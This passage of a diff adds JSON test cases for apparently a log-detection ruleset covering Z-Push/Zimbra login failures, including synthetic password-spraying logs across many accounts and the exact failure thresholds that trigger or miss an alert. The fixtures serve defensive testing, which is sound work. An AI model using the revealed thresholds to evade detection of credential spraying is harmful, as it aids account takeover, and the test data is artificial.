+   "log": "Oct 11 11:20:05 zpush1 z-push/core[41234]: [FATAL] [jdoe] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\nOct 11 11:20:05 zpush1 z-push/core[41234]: [INFO] [jdoe] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe' from='203.0.113.7' idle='0s' version='2.7.6' method='POST' httpcode='401'",
+   "location": "/var/log/syslog",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth: Z-Push syslog backend (lib/log/syslog.php, program z-push/core, no pid in the message): refusal re-labelled by account"
+  },
+  {
+   "log": "Oct 11 11:20:05 zpush1 z-push/core[41234]: [FATAL] [asmith] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\nOct 11 11:20:05 zpush1 z-push/core[41234]: [INFO] [jdoe] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe' from='203.0.113.7' idle='0s' version='2.7.6' method='POST' httpcode='401'",
+   "location": "/var/log/syslog",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: syslog backend, refusal of another account does not re-label this one"
+  },
+  {
+   "log": "Oct 11 11:20:05 zpush1 z-push/core[41234]: [FATAL] [jdoe] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\nOct 11 11:20:05 zpush1 z-push/core[41234]: [INFO] [jdoe] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe' from='203.0.113.7' idle='0s' version='2.7.6' method='POST' httpcode='401'",
+   "location": "/var/log/syslog",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: syslog backend, wrong password still counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [ 4123] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4123] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'jdoe@example.com' from IP 203.0.113.7.",
+   "location": "/var/log/z-push/autodiscover.log",
+   "expect_rule": "132224",
+   "expect_level": 2,
+   "note": "synth from autodiscover.php 2.7.6 and zimbra.php r75: autodiscover refusal re-labelled by process"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [ 4123] [FATAL] [] Exception: (AuthenticationRequiredException) - Access denied. Username or password incorrect.\n11/10/2026 11:20:01 [ 4123] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'jdoe@example.com' from IP 203.0.113.7.",
+   "location": "/var/log/z-push/autodiscover.log",
+   "expect_rule": "132211",
+   "expect_level": 5,
+   "note": "synth near-miss: autodiscover wrong password still counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [ 4131] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4131] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user1@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4132] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4132] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user2@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4133] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4133] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user3@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4134] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4134] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user4@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4135] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4135] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user5@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4136] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4136] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user6@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4137] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4137] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user7@example.com' from IP 198.51.100.202.\n11/10/2026 11:20:01 [ 4138] [FATAL] [] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [ 4138] [ WARN] [] Unable to complete autodiscover because login failed for user with email 'user8@example.com' from IP 198.51.100.202.",
+   "location": "/var/log/z-push/autodiscover.log",
+   "expect_rule": "132224",
+   "expect_level": 2,
+   "note": "synth: eight refused autodiscover logins from one address, 1.1 raised 132218 (active response)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra 2FA Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132237",
+   "expect_level": 5,
+   "note": "synth from zimbra.php r75: two-factor refusal"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra Auth Token has expired - Throw AuthenticationRequiredException to force a new connection/re-auth",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132229",
+   "expect_level": 2,
+   "note": "synth from zimbra.php r75 near-miss: an expired token is routine"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): See instructions on https://wiki.zimbra.com/wiki/DoSFilter for appending your Z-Push Server IP to the safe list",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132204",
+   "expect_level": 2,
+   "note": "synth from zimbra.php r75 near-miss: names DoSFilter and the Z-Push server IP but is neither 132231 nor 132232"
+  },
+  {
+   "log": "Oct 10 05:01:01 zpush2 zpush 10/10/2026 05:01:01 [883929] [ERROR] [asmith@example.com] Zimbra->SoapRequest(): SOAP FAULT: HTML Error Returned - Error 502 Connection to Upstream is Refused - Enable ZIMBRA_DEBUG for more details",
+   "location": "/var/log/syslog",
+   "expect_rule": "132233",
+   "expect_level": 2,
+   "note": "real (2.7.6 + r75, mail server restart): the HTML error line without the returning suffix"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [42001] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user1@example.com' from='203.0.113.101' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42002] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev02' getUser='user2@example.com' from='203.0.113.102' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42003] [ INFO] [user3@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev03' getUser='user3@example.com' from='203.0.113.103' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42004] [ INFO] [user4@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev04' getUser='user4@example.com' from='203.0.113.104' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42005] [ INFO] [user5@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev05' getUser='user5@example.com' from='203.0.113.105' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42006] [ INFO] [user6@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev06' getUser='user6@example.com' from='203.0.113.106' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42007] [ INFO] [user7@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev07' getUser='user7@example.com' from='203.0.113.107' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42008] [ INFO] [user8@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev08' getUser='user8@example.com' from='203.0.113.108' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42009] [ INFO] [user9@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev09' getUser='user9@example.com' from='203.0.113.109' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42010] [ INFO] [user10@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev10' getUser='user10@example.com' from='203.0.113.110' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42011] [ INFO] [user11@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev11' getUser='user11@example.com' from='203.0.113.111' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42012] [ INFO] [user12@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev12' getUser='user12@example.com' from='203.0.113.112' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42013] [ INFO] [user13@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev13' getUser='user13@example.com' from='203.0.113.113' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42014] [ INFO] [user14@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev14' getUser='user14@example.com' from='203.0.113.114' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42015] [ INFO] [user15@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev15' getUser='user15@example.com' from='203.0.113.115' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42016] [ INFO] [user16@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev16' getUser='user16@example.com' from='203.0.113.116' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42017] [ INFO] [user17@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev17' getUser='user17@example.com' from='203.0.113.117' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42018] [ INFO] [user18@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev18' getUser='user18@example.com' from='203.0.113.118' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42019] [ INFO] [user19@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev19' getUser='user19@example.com' from='203.0.113.119' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42020] [ INFO] [user20@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev20' getUser='user20@example.com' from='203.0.113.120' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132225",
+   "expect_level": 10,
+   "note": "synth: twenty accounts rejected from twenty addresses within ten minutes (DEV-0343 style)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [42001] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user1@example.com' from='203.0.113.101' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42002] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev02' getUser='user2@example.com' from='203.0.113.102' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42003] [ INFO] [user3@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev03' getUser='user3@example.com' from='203.0.113.103' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42004] [ INFO] [user4@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev04' getUser='user4@example.com' from='203.0.113.104' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42005] [ INFO] [user5@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev05' getUser='user5@example.com' from='203.0.113.105' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42006] [ INFO] [user6@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev06' getUser='user6@example.com' from='203.0.113.106' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42007] [ INFO] [user7@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev07' getUser='user7@example.com' from='203.0.113.107' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42008] [ INFO] [user8@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev08' getUser='user8@example.com' from='203.0.113.108' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42009] [ INFO] [user9@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev09' getUser='user9@example.com' from='203.0.113.109' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42010] [ INFO] [user10@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev10' getUser='user10@example.com' from='203.0.113.110' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42011] [ INFO] [user11@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev11' getUser='user11@example.com' from='203.0.113.111' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42012] [ INFO] [user12@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev12' getUser='user12@example.com' from='203.0.113.112' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42013] [ INFO] [user13@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev13' getUser='user13@example.com' from='203.0.113.113' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42014] [ INFO] [user14@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev14' getUser='user14@example.com' from='203.0.113.114' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42015] [ INFO] [user15@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev15' getUser='user15@example.com' from='203.0.113.115' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42016] [ INFO] [user16@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev16' getUser='user16@example.com' from='203.0.113.116' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42017] [ INFO] [user17@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev17' getUser='user17@example.com' from='203.0.113.117' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42018] [ INFO] [user18@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev18' getUser='user18@example.com' from='203.0.113.118' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42019] [ INFO] [user19@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev19' getUser='user19@example.com' from='203.0.113.119' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: nineteen is below the threshold"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [42101] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.101' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42102] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.102' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42103] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.103' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42104] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.104' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42105] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.105' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42106] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.106' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42107] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.107' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42108] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.108' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42109] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.109' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42110] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.110' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42111] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.111' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42112] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.112' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42113] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.113' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42114] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.114' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42115] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.115' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42116] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.116' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42117] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.117' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42118] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.118' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42119] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user2@example.com' from='203.0.113.119' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42120] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev00' getUser='user1@example.com' from='203.0.113.120' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: two stale phones failing twenty times from rotating carrier addresses"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [42201] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev01' getUser='user1@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42202] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev02' getUser='user2@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42203] [ INFO] [user3@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev03' getUser='user3@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42204] [ INFO] [user4@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev04' getUser='user4@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42205] [ INFO] [user5@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev05' getUser='user5@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42206] [ INFO] [user6@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev06' getUser='user6@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42207] [ INFO] [user7@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev07' getUser='user7@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42208] [ INFO] [user8@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev08' getUser='user8@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42209] [ INFO] [user9@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev09' getUser='user9@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42210] [ INFO] [user10@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev10' getUser='user10@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42211] [ INFO] [user11@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev11' getUser='user11@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42212] [ INFO] [user12@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev12' getUser='user12@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42213] [ INFO] [user13@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev13' getUser='user13@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42214] [ INFO] [user14@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev14' getUser='user14@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42215] [ INFO] [user15@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev15' getUser='user15@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42216] [ INFO] [user16@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev16' getUser='user16@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42217] [ INFO] [user17@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev17' getUser='user17@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42218] [ INFO] [user18@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev18' getUser='user18@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42219] [ INFO] [user19@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev19' getUser='user19@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42220] [ INFO] [user20@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev20' getUser='user20@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42221] [ INFO] [user21@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev21' getUser='user21@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42222] [ INFO] [user22@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev22' getUser='user22@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42223] [ INFO] [user23@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev23' getUser='user23@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42224] [ INFO] [user24@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='dev24' getUser='user24@example.com' from='203.0.113.66' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
